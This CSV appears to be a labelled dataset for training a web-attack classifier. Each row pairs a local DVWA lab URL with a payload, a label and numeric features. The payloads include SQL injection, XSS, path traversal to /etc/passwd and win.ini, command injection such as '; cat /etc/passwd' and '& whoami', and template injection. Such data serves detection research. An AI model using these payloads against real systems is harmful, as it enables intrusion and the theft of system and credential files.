label,url,param,payload,risk_level,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,' AND sleep(5) --,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,${7*7},normal,0.0,0.0,0.0,0.2,0.9976059372755566,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,' -- ,normal,-0.2887907233572612,0.0,0.0,0.8,0.7503388189738626,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,' OR 1=1 --,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,& ping -c 1 127.0.0.1,normal,-0.020349533157768735,0.0,0.0,0.0,0.9868182367880034,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,' AND sleep(5) --,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,"' UNION SELECT 1,2,3,4,5 --",normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,& whoami,normal,-0.020349533157768735,0.0,0.0,0.0,0.9870601040029024,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,' OR 1=1 --,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,' AND sleep(5) --,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,',normal,-0.020349533157768735,0.0,0.0,0.0,0.9873019712178014,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,"' UNION SELECT 1,2,3,4,5 --",normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,' OR 1=1 --,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,' -- ,normal,-0.020349533157768735,0.0,0.0,0.0,0.9868182367880034,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,"' UNION SELECT 1,2,3,4,5 --",normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,"'""><script>alert(1)</script>",normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,"'""><script>alert(1)</script>",normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",normal,-0.020349533157768735,0.0,0.0,0.0,0.9870601040029024,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,'%00,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,'%00,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,' AND sleep(5) --,normal,-0.020349533157768735,0.0,0.0,0.0,0.9875438384327004,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,'%00 -- ,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,'%00 -- ,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,' OR 1=1 --,normal,-0.020349533157768735,0.0,0.0,0.0,0.9870601040029024,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,') OR ('1'='1,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,') OR ('1'='1,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,"' UNION SELECT 1,2,3,4,5 --",normal,-0.0019152501795547043,0.0,0.0,0.0,0.9911334771147855,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,username,"""",high,0.0,0.0,0.0,0.0,0.9913978494623656,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,../../../../../../../../etc/passwd,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,../../../../../../../../etc/passwd,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,"'""><script>alert(1)</script>",normal,-0.2887907233572612,0.0,0.0,0.8,0.7503388189738626,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,..\..\..\..\..\..\..\..\windows\win.ini,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,..\..\..\..\..\..\..\..\windows\win.ini,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,""" OR 1=1 --",high,0.032974910394265235,0.0,0.0,0.0,0.9732016925246827,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,'%00,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,/etc/passwd,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,/etc/passwd,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,0,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,${7*7},high,0.032974910394265235,0.0,0.0,0.0,0.9788434414668548,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,'%00 -- ,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,0 -- ,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,0,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,') OR ('1'='1,normal,-0.2887907233572612,0.0,0.0,0.8,0.7503388189738626,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,0%00,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,& ping -c 1 127.0.0.1,high,0.0,0.0,0.0,0.0,0.9921146953405018,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,../../../../../../../../etc/passwd,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,"'""><script>alert(1)</script>",normal,-0.020349533157768735,0.0,0.0,0.0,0.9868182367880034,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,0 -- ,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,0%00%00,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,0%00,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,..\..\..\..\..\..\..\..\windows\win.ini,normal,-0.2887907233572612,0.0,0.0,0.8,0.7503388189738626,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,& whoami,high,0.0,0.0,0.0,0.0,0.989247311827957,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1  ,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,0%00%00,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,'%00,normal,-0.020349533157768735,0.0,0.0,0.0,0.9868182367880034,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,/etc/passwd,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1 #,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,'%00 -- ,normal,-0.0019152501795547043,0.0,0.0,0.0,0.9906542056074766,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,0,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/logout.php,username,',high,0.0,0.0,0.0,0.0,0.9899641577060931,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1%00,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,') OR ('1'='1,normal,-0.020349533157768735,0.0,0.0,0.0,0.9870601040029024,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1  ,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1' AND 1=1 #,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,../../../../../../../../etc/passwd,normal,-0.0019152501795547043,0.0,0.0,0.0,0.9911334771147855,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,' -- ,high,0.0,0.0,0.0,0.0,0.9878136200716846,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,0 -- ,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1 #,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1' AND 1=2 #,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,..\..\..\..\..\..\..\..\windows\win.ini,normal,-0.020349533157768735,0.0,0.0,0.2,0.9868182367880034,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,0%00,normal,-0.2887907233572612,0.0,0.0,0.8,0.7503388189738626,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1%00,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,2023-10-27,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",high,0.0,0.0,0.0,0.0,0.9878136200716846,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,/etc/passwd,normal,-0.020349533157768735,0.0,0.0,0.0,0.9870601040029024,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,0%00%00,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1' AND 1=1 #,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,; cat /etc/passwd,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,0,normal,-0.0019152501795547043,0.0,0.0,0.0,0.9906542056074766,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,1,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,1.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,' AND sleep(5) --,high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,; whoami,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,1' AND 1=2 #,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,0 -- ,normal,-0.020349533157768735,0.0,0.0,0.0,0.9877857056475995,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,1  ,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,<%= 7*7 %>,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,1 #,normal,-0.2887907233572612,0.0,0.0,0.8,0.7503388189738626,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,' OR 1=1 --,high,0.0,0.0,0.0,0.0,0.9885304659498207,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,2023-10-27,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,0%00,normal,-0.020349533157768735,0.0,0.0,0.0,0.9868182367880034,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,<body onload=alert(1)>,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,1%00,normal,-0.2909166206515737,0.0,0.0,0.8,0.7492044004329353,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,; cat /etc/passwd,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/instructions.php?doc=copying,doc,1' AND 1=1 #,normal,-0.2887907233572612,0.0,0.0,0.8,0.7503388189738626,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/logout.php,username,"' UNION SELECT 1,2,3,4,5 --",high,0.0,0.0,0.0,0.0,0.9906810035842294,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
0,http://127.0.0.1/dvwa/vulnerabilities/upload/,MAX_FILE_SIZE,0%00%00,normal,-0.020349533157768735,0.0,0.0,0.0,0.9865763695731044,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
1,http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php,page,; whoami,normal,-0.9947581605908983,0.0,0.0,0.2,0.010429011614126571,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0
